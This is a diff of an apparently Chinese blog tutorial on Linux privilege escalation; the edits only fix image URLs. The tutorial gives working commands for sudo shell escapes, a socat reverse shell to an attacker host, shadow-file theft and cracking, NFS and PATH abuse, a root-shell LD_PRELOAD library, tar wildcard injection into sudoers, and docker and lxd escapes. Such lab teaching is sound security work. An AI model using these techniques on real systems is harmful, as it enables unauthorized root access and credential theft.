-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021648338.png" alt="image-20231002164844274"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648338.png" alt="image-20231002164844274"></p>
 <p>相关命令提权方式如下：</p>
 <p><strong>find</strong>：exec参数用来指定搜索结果的处理命令，需要以分号结尾，分号在命令行有特殊函数，要用\进行转义。</p>
 <p><strong>perl</strong>：e参数用来指定要运行的命令，然后使用linux的exec参数来调用bash。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021648513.png" alt="image-20231002164858472"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648513.png" alt="image-20231002164858472"></p>
 <p><strong>python</strong>：c参数可以在命令行执行python代码，pty库是一个伪终端库，它的spawn会调用指定的程序。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021649990.png" alt="image-20231002164916950"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649990.png" alt="image-20231002164916950"></p>
 <p><strong>less</strong>：输入sudo less &#x2F;etc&#x2F;hosts（这里可以是其他文件）命令浏览文件内容时，到底部输入!bash后回车，会获得一个root权限的shell。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021649568.png" alt="image-20231002164926527"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021649472.png" alt="image-20231002164936434"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649568.png" alt="image-20231002164926527"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649472.png" alt="image-20231002164936434"></p>
 <p><strong>awk</strong>：通过调用linux的system函数来打开bash。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021649322.png" alt="image-20231002164951271"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649322.png" alt="image-20231002164951271"></p>
 <p><strong>man</strong>：通过sudo man man命令来打开man的使用手册，同时会进入编辑行，输入!bash回车，可获取root权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021650482.png" alt="image-20231002165002437"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021650294.png" alt="image-20231002165015256"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021650482.png" alt="image-20231002165002437"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021650294.png" alt="image-20231002165015256"></p>
 <p><strong>vi</strong>：sudo vi会进入vi默认页，输入:!bash回车，可进入root命令行。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021650682.png" alt="image-20231002165029622"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021651584.png" alt="image-20231002165136544"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021650682.png" alt="image-20231002165029622"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021651584.png" alt="image-20231002165136544"></p>
 <p>脚本：如果sudoers定义了可以执行某个脚本，则我们可以把返回shell的代码添加进去。</p>
 <p>例如桌面有个运维需要的aaa.sh文件，我们添加一段打开bash的代码，然后sudo运行即可。</p>
 <p>参考代码：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021652817.png" alt="image-20231002165214773"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021652817.png" alt="image-20231002165214773"></p>
 <p><strong>应用程序</strong></p>
 <p>除了上面的一些二进制文件，一些应用程序也可以获取root权限，例如env、ftp、socat、scp。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021652927.png" alt="image-20231002165226882"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021652927.png" alt="image-20231002165226882"></p>
 <p>env(<strong>Linux</strong>系统里的env命令可以显示当前用户的环境变量，还可以用来在指定环境变量下执行其他命令)：</p>
 <p>通过env环境变量来获取root权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021653695.png" alt="image-20231002165331654"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021653695.png" alt="image-20231002165331654"></p>
 <p>ftp：通过ftp来进入bash获取root权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021653912.png" alt="image-20231002165342870"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021653912.png" alt="image-20231002165342870"></p>
 <p>socat(nc加强版)：通过socat客户端连接攻击机，攻击机可获得rootshell。先执行服务端，后执行客户端。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#客户端执行</span><br><span class="line">sudo socat exec:&#x27;sh -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444</span><br><span class="line">#攻击机执行</span><br><span class="line">socat file:`tty`,raw,echo=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021654136.png" alt="image-20231002165406093"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021654136.png" alt="image-20231002165406093"></p>
 <p>还有一个scp，scp是一个安全复制文件的命令，它无法获取一个shell，但可以用来复制一些系统的敏感</p>
 <p>文件。例如etc&#x2F;passwd、etc&#x2F;shadow等。</p>
 <p>如下命令，将passwd文件传输到指定机器的root&#x2F;Desktop下，然后再对密码进行破解等操作。（需要开启攻击机的ssh服务）</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021654747.png" alt="image-20231002165416704"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021654747.png" alt="image-20231002165416704"></p>
 <p>（配合john爆破etc&#x2F;shadow中的密码）</p>
 <p><strong>黑名单情况</strong></p>
 <p>如果碰到sudoers文件使用黑名单的情况，比如说权限禁用sudo使用find命令，但是都是在ALL基础上设置的，那么可以cp把find复制到其它目录运行。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021654181.png" alt="image-20231002165456122"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021654181.png" alt="image-20231002165456122"></p>
 <p><strong>NFS配置不当导致提权</strong></p>
 <p>NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享</p>
 <p>简单配置一下：</p>
@@ -418,34 +418,34 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># nfs通过rpc通信，这里把rpcbind也重启下</span><br><span class="line">sudo /etc/init.d/rpcbind restart</span><br><span class="line">sudo /etc/init.d/nfs-kernel-server restart</span><br></pre></td></tr></table></figure>
 
 <p>此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655543.png" alt="image-20231002165507497"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655543.png" alt="image-20231002165507497"></p>
 <p>或者通过nmap的相关脚本来进行扫描。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655509.png" alt="image-20231002165521449"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655509.png" alt="image-20231002165521449"></p>
 <p><strong>NFS****配置不当可提权</strong></p>
 <p>当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。测试如下：</p>
 <p>首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655094.png" alt="image-20231002165533023"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655094.png" alt="image-20231002165533023"></p>
 <p>此时目标机的home目录下就会有一个具有suid权限的bash。</p>
 <p>普通用户执行即可获取root权限，这里注意需要加上p参数，否则权限还是当前用户的。</p>
 <p>p参数说明：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承euid，因为bash有suid权限，所以这里是root。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655261.png" alt="image-20231002165545218"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655261.png" alt="image-20231002165545218"></p>
 <p>使用场景：这个和suid提权很像，给程序赋予suid权限然后利用。不同的是前两篇suid提权是当前用户使用sudo chmod自己修改的，在sudoers禁用sudo命令等情况下，就行不通了。而nfs配置利用，是客户端挂载到本地赋权的，目标机的普通用户只需执行就可以。</p>
 <p>同理，之前总结的suid提权的那些程序也同样适用，这里就不再记了。</p>
 <p><strong>其它命令</strong></p>
 <p>除了可以直接得到shell的，还有其他一些程序不能直接获取，例如nano、vi等。</p>
 <p>例如nano被共享了，则可以给nano一个suid权限，然后来读取敏感文件，爆破密码从而登录。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655831.png" alt="image-20231002165556759"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655831.png" alt="image-20231002165556759"></p>
 <p>然后使用nano -p来读取shadow文件，这里读取时把相关记录复制出来，使用john破解，测试不能重定向，需要权限，所以只能复制。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021656644.png" alt="image-20231002165607584"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021656644.png" alt="image-20231002165607584"></p>
 <p>复制后使用john破解获取相关用户密码，以aaa为例，密码是aaa。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021656521.png" alt="image-20231002165649474"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021656521.png" alt="image-20231002165649474"></p>
 <p>(再次破解相同用户，需要加 –show 参数)</p>
 <p>如果密码太复杂，破解不了，则可以尝试其它用户</p>
 <p>这时候不确定aaa是否为root权限，则可以继续使用nano去编辑passwd文件(.&#x2F;nano &#x2F;etc&#x2F;passwd)，给aaa赋权。</p>
 <p>把原来的1001换成0</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021657208.png" alt="image-20231002165700163"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021657208.png" alt="image-20231002165700163"></p>
 <p>然后切换aaa用户即可。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021657300.png" alt="image-20231002165739260"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021657300.png" alt="image-20231002165739260"></p>
 <p>利用这种机制，也可以用来修改sudoers文件，添加或修改为以下内容。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>
 
@@ -453,28 +453,28 @@
 <p><strong>使用PATH变量进行提权</strong></p>
 <p>Linux中的PATH是一个环境变量，它指定了可执行程序所在的目录，例如bin和sbin目录，当我们在终端运行一个命令时，系统就会根据PATH来查找相关的可执行文件。</p>
 <p>可以执行env命令列出所有的环境变量，然后找到PATH，或者grep进行结果筛选，或者echo出$PATH值，命令如下。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021657150.png" alt="image-20231002165758111"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021657150.png" alt="image-20231002165758111"></p>
 <p><strong>ps结合PATH提权</strong></p>
 <p>首先编译以下c代码，功能为调用ps命令。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    system(&quot;ps&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021658904.png" alt="image-20231002165818860"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658904.png" alt="image-20231002165818860"></p>
 <p>随后以root身份赋予777权限，然后再赋予一个suid权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021658617.png" alt="image-20231002165829570"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658617.png" alt="image-20231002165829570"></p>
 <p>此时普通用户执行这个shell文件，可以看到就是执行的ps命令。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021658376.png" alt="image-20231002165841327"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658376.png" alt="image-20231002165841327"></p>
 <p><strong>利用</strong>：到tmp目录下，把bash写到一个ps文件中，然后修改PATH变量添加tmp目录，再去执行shell，就会获得一个root权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021658432.png" alt="image-20231002165853385"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658432.png" alt="image-20231002165853385"></p>
 <p>过程：root给一个可执行文件赋予了suid，而此文件又调用了ps命令，这时修改PATH把tmp添加到头的位置，系统再执行就会先去tmp目录下找，tmp目录下放的是恶意程序，从而导致恶意程序以root权限运行。</p>
 <p>情况：这种情况适用于，给普通用户分配了个可执行程序，且该程序有suid权限，我们又知道该程序会调用哪些命令，那么就可以结合PATH来进行提权。</p>
 <p><strong>cp结合PATH提权</strong></p>
 <p>除了把bash写到ps文件中以外，还可以把类似于sh的可执行程序复制过来。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021659630.png" alt="image-20231002165916588"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021659630.png" alt="image-20231002165916588"></p>
 <p><strong>符号连接结合PATH提权</strong></p>
 <p>还可以通过ln命令来设置一个连接，连接到sh，但条件是当前可执行程序所在目录要有相关权限，我这里就直接sudo创建了。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021659522.png" alt="image-20231002165932468"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021659522.png" alt="image-20231002165932468"></p>
 <p>如果在tmp下创建连接，这里测试并不会调用</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021700381.png" alt="image-20231002170007338"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021700381.png" alt="image-20231002170007338"></p>
 <p><strong>总结</strong></p>
 <p>上面以ps为例，其它命令都可以，例如id、whoami、cat、vim等等，方法都一样，只是改下tmp目录下的文件名。</p>
 <p><strong>使用LD_PRELOAD进行提权</strong></p>
@@ -482,52 +482,52 @@
 <p>测试前先按如下配置一下sudoers文件，以aaa用户为例，添加一个find命令和一个LD_PRELOAD。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaa ALL=(ALL:ALL) NOPASSWD:/usr/bin/find</span><br><span class="line">Defaults env_keep += LD_PRELOAD</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021700081.png" alt="image-20231002170035032"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021700081.png" alt="image-20231002170035032"></p>
 <p>配置用户sudo权限之前有记录过，这里记录下env_keep的说明。</p>
 <p>例如aaa用户有一个aaa的环境变量，当通过su切换到bbb用户时，再查看env环境变量，aaa就没有了，也就意味着用户的切换不会带着环境变量一块切过去。而想保持某个环境不受用户切换的影响，那么可以在sudoers文件中设置env_keep。</p>
 <p><strong>提权测试</strong></p>
 <p>切换回普通用户，查看sudo权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021701537.png" alt="image-20231002170124491"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021701537.png" alt="image-20231002170124491"></p>
 <p>我们有一个find的sudo权，且env_keep中定义了LD_PRELOAD，那么我们就可以定义一个恶意的so文件，然后sudo运行find时指定LD_PRELOAD来加载我们自己的so文件，就可以实现提权</p>
 <p>so文件的c代码如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void _init()</span><br><span class="line">&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    setgid(0);</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>然后进行编译-fPIC -shared参数简单理解就是动态编辑共享库，可以进行公共调用，nostartfiles参数代表该库运行不会去调用系统的其它库，避免影响自己的程序执行。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021702470.png" alt="image-20231002170217426"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021702470.png" alt="image-20231002170217426"></p>
 <p>编译后我们使用sudo运行find并指定LD_PRELOAD为我们编译的shell.so文件，这时find就会先调用shell.so，导致我们的代码被执行，返回的权限为root。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021702260.png" alt="image-20231002170237213"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021702260.png" alt="image-20231002170237213"></p>
 <p>注意点：如果使用自己攻击机编译的so文件，传到目标机可能普通用户没有执行权限，这时需要加下权限。如果目标机支持gcc编译，也可以直接在目标机编译。</p>
 <p><strong>总结</strong></p>
 <p>使用情况就是sudoers中的env_keep定义了LD_PRELOAD，然后sudo有相关的命令，那么sudo运行命令时就可以通过LD_PRELOAD来指定恶意so文件。</p>
 <p><strong>利用Cron进行提权</strong></p>
 <p>cronjobs是定时任务，在特定的日期和时间执行计划任务。例如定期备份或者定期清理某个目录等都会用到，定义格式如下：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021703832.png" alt="image-20231002170300781"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021703832.png" alt="image-20231002170300781"></p>
 <p><strong>crontab文件覆盖</strong></p>
 <p>这里以root用户创建一下测试环境，首先创建一个cron，运行一个脚本，该脚本功能是定时清除特定目录，例如&#x2F;tmp&#x2F;filetest。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021703510.png" alt="image-20231002170343455"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021703510.png" alt="image-20231002170343455"></p>
 <p>这里写一个py脚本，并添加执行权限（chmod 777 clear.py）</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021704946.png" alt="image-20231002170401888"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021704946.png" alt="image-20231002170401888"></p>
 <p>然后添加定时任务。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021704297.png" alt="image-20231002170422230"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021704297.png" alt="image-20231002170422230"></p>
 <p>这时每隔两分钟，clear脚本就会被执行一次。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021704045.png" alt="image-20231002170447982"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021704045.png" alt="image-20231002170447982"></p>
 <p>提权方法就是替换clear脚本的内容，我们可以往脚本添加相关的命令，即把&#x2F;bin&#x2F;dash设置为suid权限即可</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021705474.png" alt="image-20231002170512410"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021705474.png" alt="image-20231002170512410"></p>
 <p>dash相比bash要小，运行速度更快，如果是脚本调用，可以使用dash。随后可以看到dash具有suid权限，运行然后添加p参数来继承上级权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021705264.png" alt="image-20231002170529203"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021705264.png" alt="image-20231002170529203"></p>
 <p>除此外，也可以添加修改sudoers或者添加etc&#x2F;passwd的命令等等。</p>
 <p><strong>通配符介绍</strong></p>
 <p>linux中有很多通配符，和正则类似，例如tar一个目录，如果写 * ，就代表压缩当前目录下的所有文件，* 代表一个或多个字符。</p>
 <p>在操作过程中，如果有文件名的名字是一个参数，那么执行过程中，就会被当作参数运行。例如一个目录下有一个叫–help的文件，当cat查看该文件内容时，实际上确是cat的帮助信息。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021706130.png" alt="image-20231002170602067"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021706130.png" alt="image-20231002170602067"></p>
 <p><strong>crontab通配符注入</strong></p>
 <p>常见的定时任务除了定时清除文件外，定时压缩也会很常见，例如有一个定时任务，每分钟回去执行&#x2F;var&#x2F;www&#x2F;html&#x2F;cron.sh脚本，该脚本是备份html网站，脚本内容如下，记得修改权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">cd /var/www/html/</span><br><span class="line">tar cf /var/backups/html.tar *</span><br></pre></td></tr></table></figure>
 
 <p>添加定时任务，每分钟执行一次</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021706203.png" alt="image-20231002170625165"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021706203.png" alt="image-20231002170625165"></p>
 <p>此时可以验证下，定时任务已经生效</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021707873.png" alt="image-20231002170706823"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021707873.png" alt="image-20231002170706823"></p>
 <p>在tar命令中有一个checkpoint参数，即检查点，比如checkpoint&#x3D;1，则代表压缩过程中每压缩一个文件就去执行一个检查操作。</p>
 <p>而这个检查操作的参数是**–checkpoint-action&#x3D;exec&#x3D;**，后面可以跟要执行的命令。</p>
 <p>利用思路就是我们写入一个sh脚本，该脚本作用是修改sudoers文件，把当前用户添加进去，获得sudo所有权，从而进行提权。然后利用checkpoint-action&#x3D;exec&#x3D;接一个执行sh脚本的命令即可。</p>
@@ -535,22 +535,22 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;echo &quot;aaa ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27; &gt; test.sh</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;</span><br></pre></td></tr></table></figure>
 
 <p>等待一分钟后，sudoers就会被追加aaa用户的权限，然后就可以使用sudo bash来提权</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021707719.png" alt="image-20231002170723667"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021707719.png" alt="image-20231002170723667"></p>
 <p>这里查看当前用户的sudo权限也可以发现，每分钟sudoers就会被追加一行。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021707145.png" alt="image-20231002170746091"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021707145.png" alt="image-20231002170746091"></p>
 <p><strong>利用Docker进行提权</strong></p>
 <p>在docker中，是允许访问root用户和docker组中的其它用户的，测试如下。</p>
 <p>首先以root身份把一个普通账号添加到docker组，这里是aaa用户。然后使用newgrp将root账号初始组切换为docker。</p>
 <p>usermod命令用来修改指定用户的属组，G参数指定要添加的组名称。</p>
 <p>newgrp命令切换默认属组。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021708726.png" alt="image-20231002170815680"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021708726.png" alt="image-20231002170815680"></p>
 <p>然后切换到aaa，可以看到当前已在docker组。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021708515.png" alt="image-20231002170832471"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021708515.png" alt="image-20231002170832471"></p>
 <p>随后使用docker run来允许alpine镜像（小型Linux系统），v参数进行挂载，是将宿主机的root目录挂载到alpine的mnt下，使用冒号分隔。i参数是保持打开状态，t参数是分配一个tty终端，it一般结合使用，即保持通讯终端的打开。</p>
 <p>这时访问docker镜像alpine，就相当于访问宿主机的root目录，权限变成了root。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /root:/mnt -it alpine</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021709892.png" alt="image-20231002170900822"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021709892.png" alt="image-20231002170900822"></p>
 <p>利用方式还有很多，例如将宿主机的etc挂载过来，然后查看shadow文件，进行密码破解。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /etc/:/mnt -it alpine</span><br></pre></td></tr></table></figure>
 
@@ -575,26 +575,26 @@
 <p>zfs是一个文件系统类型，具体说明可参考如下链接</p>
 <p><a target="_blank" rel="noopener" href="https://blog.dustinkirkland.com/2016/02/zfs-is-fs-for-containers-in-ubuntu-1604.html">https://blog.dustinkirkland.com/2016/02/zfs-is-fs-for-containers-in-ubuntu-1604.html</a></p>
 <p>这里测试aaa账户，把aaa添加到 lxd组</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021709579.png" alt="image-20231002170928534"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021709579.png" alt="image-20231002170928534"></p>
 <p>随后使用lxd命令进行lxd初始化，在初始化过程中，对于存储选项默认是zfs，这里改成dir，其它默认即可，如下图。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021709699.png" alt="image-20231002170948639"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021709699.png" alt="image-20231002170948639"></p>
 <p>lxd初始化后，就可以进行容器部署了。</p>
 <p>这里先使用lxc来启动一个容器，会现在本地找，本地没有会去下载部署然后启动</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021711925.png" alt="image-20231002171101874"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711925.png" alt="image-20231002171101874"></p>
 <p>容器部署启动后，就可以通过lxc list命令来查看已经启动的容器。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021711697.png" alt="image-20231002171116650"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711697.png" alt="image-20231002171116650"></p>
 <p>这时环境就可以了</p>
 <p><strong>攻击机设置</strong></p>
 <p>这里攻击机以kali为例，首先需要下载alpine，然后进行build构建，命令如下图</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021711025.png" alt="image-20231002171128953"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711025.png" alt="image-20231002171128953"></p>
 <p>此时就会生成一个tar.gz包，把该包传到目标机的tmp下</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021711198.png" alt="image-20231002171153128"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711198.png" alt="image-20231002171153128"></p>
 <p>导入tmp后，我们把该映像添加到lxd中，添加后可通过lxc image list查看</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021712359.png" alt="image-20231002171238297"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021712359.png" alt="image-20231002171238297"></p>
 <p>随后进行提权操作，相关命令和说明如下：</p>
